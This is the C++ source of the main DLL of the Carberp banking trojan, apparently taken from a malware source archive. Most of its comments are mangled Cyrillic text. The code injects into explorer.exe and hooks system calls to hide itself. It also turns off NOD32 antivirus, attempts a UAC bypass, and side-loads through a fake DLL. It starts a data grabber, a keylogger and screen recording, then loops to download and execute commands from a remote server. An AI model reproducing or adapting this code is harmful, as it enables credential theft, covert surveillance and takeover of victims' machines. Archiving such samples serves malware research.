/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
// dllmain.cpp: ���������� ����� ����� ��� ���������� DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"


#include "Crypt.h"
#include "BootkitCrypt.h"
#include "Modules.h"
#include "ntdll.h"
#include "coocksol.h"
#include "md5.h"
#include "DbgRpt.h"

#include "BotAutoUpdate.h"

#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  ������� ���������� �����
//------------------------------------------------------------------------------
#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
DWORD dwWebMoneySelf = 0;

//���������� ���������� ��� �������� ������ ��� ������� ���� Fake.dll
char FakeDllPathBot[MAX_PATH]; //���� � ������������ ���� ���� (bot.plug)
char FakeDllPathDll[MAX_PATH]; //���� � ����� Fake.dll, �� �������� ������������ dll
char FakeDllPathOrigDll[MAX_PATH]; //���� � ������������ ���
char FakeDllCryptKey[32]; //���� ��� ���������� ���� ����
int FakeDllLenCryptKey = 0; //����� ����� ���������� ���� ����

//DWORD dwExplorerPid  = 0; //��� ����������

DWORD WINAPI LoaderRoutine(LPVOID Data);

BOOL RunLoaderRoutine()
{
/*
#ifdef UAC_bypassH
	if( !RunBotBypassUAC(0) )
		return MegaJump( LoaderRoutine );
	return true;
#else
*/
	return MegaJump( LoaderRoutine );
//#endif
}

BOOL RunVideoProcess()
{
	DLLDBG( "Main", "������ �������� � ��������� ��������" );
	return MegaJump( VideoProcess::StartSvchost );
}



DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	BOT::Initialize(ProcessLoader);

	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");

	switch( BOT::GetBotType() )
	{
		//���� ���������� �� ��� �������, �� ������� ring3 ���� �� ������������
		case BotBootkit: 
			BOT::UninstallService();
			BOT::DeleteAutorunBot();
			break;

		// ��� ������� �� ��� ������� �������� ��������������
		case BotLoaderPlugin:
			StartAutoUpdate();
			break;
	}

	//UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// �������������� ������� �������� �������������� ����������
	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}

	// 402_pl ������ ����� ��������� ������ (�� ���������� � ������ ��������)
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));

	// ��������� ����� �������� ������
	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;

	#ifdef VideoRecorderH
		#ifndef VideoProcessSvchost
			if( VideoProcess::Start() )
				DLLDBG( "Main", "��������� ����� �������" );
			else
				DLLDBG( "Main", "ERROR: �� ���������� ����� �������" );
		#endif //VideoProcessSvchost
	#endif

	DLLDBG("====>Bot Loader", "�������� ���������� ������");
	if (InitializeTaskManager(NULL, true))
	{
		while (true)
		{
			// 403_pl ���� ��������� ������
			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
			
			DownloadAndExecuteCommand(NULL, NULL);

			// "������������" �������������� ����������� ���� � ��� �������
			// �������� ��������� ���������� ������ ���� ������ ����� ���������
			// �������
			if (!FirstSended)
			{
				DLLDBG("====>Bot Loader", "���������� ���������� � �������");
				FirstSended = SendFirstInfo();
			}


			// ���������������� ���������� ������
			if (!TaskManagerSleep(NULL))
				break;
		}
	}
	pExitProcess(0);
	return 0;
}

DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "��������� ���:\n ������� [%s] \n WorkPath: %s", GetPrefix().t_str(), BOT::WorkPath().t_str());
	
	//�������� ������� �� ���������� �����, ������� ��� �������� ���������� �������
	BOT::SavePrefixFromTemporaryFile(false);
	//UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();
	
	// �������������� ������� �������� �������������� ����������
	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	DLLDBG("====>Bot DLL", "�������� Loader ()");
	RunLoaderRoutine();

	#ifdef VideoProcessSvchost
		RunVideoProcess();
	#endif

	DLLDBG( "Main", "��������� NOD32" );
	OffNOD32();

	// 401_pl ������ BotPlug
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("401_pl"));
	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "�������� ������");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// �������� ������� ������ ����������

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}

//-----------------------------------------------------------
//  Start - ������� ��������� ������ �� ����������.
//          ����� ������ ������� ������������� ��, ��� dll 
//          ���� ��������� �� ������ ��� ������ ���������
//          ������� dll.
//-----------------------------------------------------------
extern"C"  void WINAPI Start(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin)
{
	if (Initialize)
	{
		BOT::Initialize(ProcessUnknown);
		if (IsLoaderPlugin)
			BOT::SetBotType(BotLoaderPlugin);
	}
	if (Start)
	{
		HANDLE H = StartThread(ExplorerMain, NULL);
	}
}


//-----------------------------------------------------------
//  Start32 - �������������� �������, ������� �������
//            � 32 ��������� �������� 
//-----------------------------------------------------------
DWORD WINAPI Start32(LPVOID)
{
	BOT::Initialize();
	string Message;
	Message.Format("Injected in process %s", Bot->ApplicationName().t_str());
	pMessageBoxA(0, Message.t_str(), "Inject report", 0);
	return 0;
}



//-----------------------------------------------------------
// MyDllMain - ����� ����� DLL
//-----------------------------------------------------------
BOOL APIENTRY MyDllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{
	char buf[MAX_PATH];
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			BOT::Initialize(ProcessUnknown);
#ifdef UAC_bypassH
			//������� �������� ������� ��������� ����� ������ UAC
			if( ExecTaskAfterUAC() ) return TRUE;
#endif //UAC_bypassH

			pGetModuleFileNameA( NULL, buf, MAX_PATH );
			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //�������� ���� � �������� ���������� (explorer.exe)
			{
				if( BOT::CreateBootkitMutex())
				{
					BOT::SetBotType(BotBootkit);
					StartThread(ExplorerMain, NULL);
				}
			}
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}

bool FakeDllDelete()
{
	BOT::DeleteBotFile(FakeDllPathBot);
	//���� ������������ ������������ ��� ����� ���������� (�� ������ �������), �� ��������������� ����� ������
	if( !pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING ) )
		pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
	return true;
}

//������� ����������� �������� ���� � ��������� ��������
DWORD WINAPI DeleteFakeDllInSvchost(LPVOID Data)
{
	BOT::Initialize(ProcessUnknown);
	pSleep(10 * 1000); //���� ��������� �����
	DLLDBG( "DeleteFakeDllInSvchost", "Unisntall fake dll" );
	KillAllBrowsers();
	pSleep(5 * 1000);
	FakeDllDelete();
	return 0;
}

// �-��� ��� ������ � Explorer ��� �������� �� StartFromFakeDll
DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
{
	BOT::Initialize(ProcessUnknown);
	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
	// ��� �������� ������ �������� Start, ��������������� ���
	// �������� ������� Bot.plug
	BOT::SetBotType(BotFakeDll);
	#ifdef IFobsH
		RunThread( IFobs::KillIFobs, (void*)10 );
	#endif
	Start(TRUE, TRUE, FALSE);
	return 0;
}

// �������������� �-��� ��� ������� Bot.plug �� FakeDll.
// pathBotPlug - ���� � ������� ��������� ���� ���
// pathFakeDll - ���� � fake.dll 
// pathOrigDll - ���� � ��� ������� ��������� �� fake.dll
// cryptKey - ���� ��� ���������� ���� ���� ��� ���������� (��������� ������)
// ��� ��������� ���������� ��� �������� � ���������� ����
BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey )
{
//	BOT::Initialize();
	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );

	m_lstrcpy( FakeDllPathBot, pathBotPlug );
	m_lstrcpy( FakeDllPathDll, pathFakeDll );
	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
	FakeDllLenCryptKey = m_lstrlen(cryptKey);
	m_memcpy( FakeDllCryptKey, cryptKey, FakeDllLenCryptKey );
	FakeDllCryptKey[FakeDllLenCryptKey] = 0;

	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s'", cryptKey );

	if( BOT::BootkitIsRun() ) //���� ������� ������, �� ������� ��� ������ ����
	{
		MegaJump(DeleteFakeDllInSvchost);
	}
	else
	{
		// ������� �� �� - ������� �� ���
		HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();

		DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
		if (BotInstanceMutex )
		{
			pCloseHandle(BotInstanceMutex); //��������� ������, ����� ��� ����� ������� � �������� explorer.exe
			return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
		}
	}
	return FALSE;
}
